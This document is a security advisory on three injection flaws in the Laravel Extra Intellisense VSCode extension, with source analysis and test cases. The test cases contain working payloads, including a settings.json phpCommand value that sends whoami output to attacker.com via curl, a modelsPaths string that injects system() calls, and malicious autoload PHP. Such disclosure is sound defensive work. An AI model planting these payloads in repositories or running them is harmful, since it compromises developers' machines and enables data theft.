# Laravel Extra Intellisense Extension Vulnerabilities

## Command Injection via Workspace Settings

### Description
The Laravel Extra Intellisense extension allows users to configure the PHP command that executes code to interact with Laravel applications via the `LaravelExtraIntellisense.phpCommand` setting. This setting can be exploited by a malicious repository to execute arbitrary system commands when a victim opens the project in VSCode with this extension installed.

When a victim opens a malicious repository in VSCode, the extension will use the workspace-defined `phpCommand` setting to execute PHP code. An attacker can craft this setting to include shell command injection payloads that will be executed on the victim's machine.

In `Helpers.runPhp()`, the command is built as follows:
```typescript
let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
let command = commandTemplate.replace("{code}", code);
cp.exec(command, ...);
```

No checks are made on the final value of "commandTemplate" to ensure that no rogue shell metacharacters or additional commands are present.

### Impact
Critical - The attacker can execute arbitrary system commands with the privileges of the VSCode user. This can lead to:
- Data exfiltration
- Installation of malware or backdoors
- Lateral movement within networks
- Complete compromise of the victim's machine

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- Some basic escaping of quotes in the PHP code string
- A security note in the README advising users about the extension running Laravel application automatically
- On Unix systems the "$" character is also escaped, along with double quotes

### Missing Mitigations
- No validation or sanitization of the `phpCommand` configuration value
- No warning when a workspace contains a custom `phpCommand` configuration
- No sandboxing or restriction of the executed commands
- No option to disable auto-execution of commands when opening a new workspace
- Lack of thorough validation and sanitization of the user-supplied configuration
- Absence of an allow-list of safe command formats

### Preconditions
1. Victim must have the Laravel Extra Intellisense extension installed
2. Victim must open a malicious repository in VSCode
3. Extension must be enabled for the workspace

### Source Code Analysis
The vulnerability originates in the `helpers.ts` file, specifically in the `runPhp` method:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);
    
    // This is where the command is executed
    cp.exec(command, 
        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
        function (err, stdout, stderr) { ... }
    );
}
```

The issue is that `commandTemplate` is read from the workspace configuration without validation. When the extension is activated in `extension.ts`, it immediately attempts to load data from the Laravel project by executing various PHP commands through the `runLaravel` method, which ultimately calls `runPhp`.

All provider classes (RouteProvider, ViewProvider, etc.) call `Helpers.runLaravel()` during their initialization, which triggers the vulnerability as soon as the extension is activated.

### Security Test Case

1. Create a malicious Laravel repository with the following structure:
   ```
   /malicious-laravel-project
     ├── artisan                   # Empty file to trick the extension
     ├── bootstrap
     │   └── app.php               # Empty file to trick the extension
     ├── vendor
     │   └── autoload.php          # Empty file to trick the extension
     └── .vscode
         └── settings.json         # Contains the malicious configuration
   ```

2. In the `.vscode/settings.json` file, add the following configuration:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "php -r \"echo 'Benign output';\" & curl -s http://attacker.com/steal?data=$(whoami) #"
   }
   ```

3. Share the repository with the victim (e.g., via GitHub, direct download)

4. When the victim opens the project in VSCode with Laravel Extra Intellisense installed:
   - The extension activates and checks if it's a Laravel project
   - It finds the artisan, bootstrap/app.php, and vendor/autoload.php files
   - It reads the custom phpCommand from settings.json
   - It executes the command, which:
     - Runs the benign PHP code to avoid raising suspicion
     - Executes the curl command to send the username to the attacker's server
     - Comments out the rest of the intended PHP code with #

5. Verify that the attacker's server receives the data with the victim's username

This test confirms that the vulnerability can be exploited to execute arbitrary commands and exfiltrate data from the victim's machine.

## Untrusted Laravel Bootstrap and Autoload Execution

### Description
The Laravel Extra Intellisense extension directly executes PHP code in the context of the Laravel application it's analyzing. If a malicious repository can manipulate certain PHP files that are loaded by the extension, an attacker could achieve PHP code execution on the victim's machine.

The extension periodically calls the helper function `Helpers.runLaravel()` to boot the Laravel application and extract data (such as routes, models, and middlewares). It constructs a PHP command that automatically requires both `vendor/autoload.php` and `bootstrap/app.php` using paths computed by `Helpers.projectPath()`. An attacker supplying a malicious repository can modify these Laravel core files (or include extra code among them) so that when they are required by PHP, arbitrary PHP code will run.

### Impact
High - The attacker can execute arbitrary PHP code on the victim's machine, which can lead to:
- Data theft
- File system access
- Network access from the victim's machine
- Potential escalation to full command execution
- Full system compromise (data theft, file modification, command execution, etc.)

### Vulnerability Rank
High

### Currently Implemented Mitigations
- Security note in README warning that the extension runs the Laravel application
- A security note warns users to disable the extension if sensitive code (such as in service providers) is being written. This note is advisory only.

### Missing Mitigations
- No sandboxing of the PHP execution environment
- No validation of the Laravel project before executing its code
- No option to approve execution when opening untrusted projects
- No runtime code integrity checks (for example, cryptographic signature verification of critical files)
- Lack of sandboxing or isolation when booting the Laravel application from the repository

### Preconditions
1. Victim must have the Laravel Extra Intellisense extension installed
2. Victim must open a malicious repository in VSCode
3. PHP must be installed on the victim's machine

### Source Code Analysis
In `helpers.ts`, the `runLaravel` method loads PHP files from the Laravel project:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            // ... more PHP code
            // Includes the user's code here
            code +
            // ... more PHP code
        
        return new Promise(function (resolve, error) {
            self.runPhp(command, description)
            // ...
        });
    }
    return new Promise((resolve, error) => resolve(""));
}
```

The vulnerability is that the extension directly `require_once`s PHP files from the project, including `vendor/autoload.php` and `bootstrap/app.php`. If these files contain malicious code, it would be executed when the extension runs. Because the file paths come directly from the workspace (or via a relative configured "basePath"), no checks or sanitization of these core files are performed.

### Security Test Case

1. Create a malicious Laravel repository with the following structure:
   ```
   /malicious-laravel-project
     ├── artisan                  # Empty file to trick the extension
     ├── bootstrap
     │   └── app.php              # Contains malicious PHP code
     └── vendor
         └── autoload.php         # Contains malicious PHP code
   ```

2. In `vendor/autoload.php`, add malicious code:
   ```php
   <?php
   // Malicious code to create a file with system information
   file_put_contents('/tmp/hacked.txt', 'System compromised: ' . php_uname() . "\n");
   // Return a valid value to make the extension continue
   return [];
   ```

3. In `bootstrap/app.php`, add:
   ```php
   <?php
   // More malicious actions could be performed here
   // Return a valid Laravel application mock to make the extension continue
   return new stdClass();
   ```

4. Share the repository with the victim

5. When the victim opens the project in VSCode:
   - The extension loads and executes vendor/autoload.php and bootstrap/app.php
   - The malicious code is executed, creating the file /tmp/hacked.txt
   - The extension may show errors because the returned values aren't proper Laravel objects, but the malicious code has already run

6. Verify that the file /tmp/hacked.txt has been created on the victim's machine

This test confirms that PHP code execution is possible through the extension's direct loading of project PHP files.

## PHP Code Injection via Malicious "modelsPaths" Configuration

### Description
In `EloquentProvider.loadModels()`, the extension reads the workspace configuration value for `LaravelExtraIntellisense.modelsPaths`. This value (an array of directory paths) is concatenated directly into a PHP code string with no escaping. For example, the code is built as follows:

```typescript
"foreach (['" +
  vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') +
"'] as $modelPath) { … }"
```

An attacker who is able to control the workspace settings (for instance, via a malicious .vscode/settings.json file packaged with the repository) can supply a string containing a single quote and additional PHP commands.

### Impact
High - This may result in arbitrary PHP code injection and execution when the extension queries for Eloquent models, which can lead to:
- Data theft
- File system access
- Network access from the victim's machine
- Potential escalation to full command execution

### Vulnerability Rank
High

### Currently Implemented Mitigations
- There is no additional sanitization or proper escaping applied to the configuration values before they are embedded into the PHP command string.

### Missing Mitigations
- Sanitization and proper escaping of configuration inputs before concatenation into executable code.
- Use of parameterized methods or safe templating for building PHP code.

### Preconditions
- The attacker controls the workspace configuration (for example, via a committed .vscode/settings.json in the repository) and supplies a crafted value such as:
`"app'; system('malicious_command'); //"`

### Source Code Analysis
In `EloquentProvider.loadModels()`, the line
```
"foreach (['" + <modelsPaths array>.join('\', \'') + "'] as $modelPath) { … }"
```
directly injects the configuration into a PHP array literal. If one of the strings contains an unescaped single quote, PHP will interpret it as the end of the literal and execute subsequent injected code.

### Security Test Case
1. In a test repository, create a `.vscode/settings.json` that sets "LaravelExtraIntellisense.modelsPaths" to an array including an entry such as:
   ```json
   {
     "LaravelExtraIntellisense.modelsPaths": ["app'; file_put_contents('pwned.txt', 'injected'); //", "app/Models"]
   }
   ```

2. Ensure that the test repository has the minimum structure to be recognized as a Laravel project:
   ```
   /malicious-laravel-project
     ├── artisan                  # Empty file to trick the extension
     ├── bootstrap
     │   └── app.php              # Empty file to trick the extension
     └── vendor
         └── autoload.php         # Empty file to trick the extension
   ```

3. Open this repository in VSCode and trigger a refresh (for example, by opening a PHP file that causes Eloquent provider to load).

4. Check for the presence of the file "pwned.txt" (or any evidence that the injected code was executed).

This test confirms that PHP code injection is possible through malicious configuration of the models paths.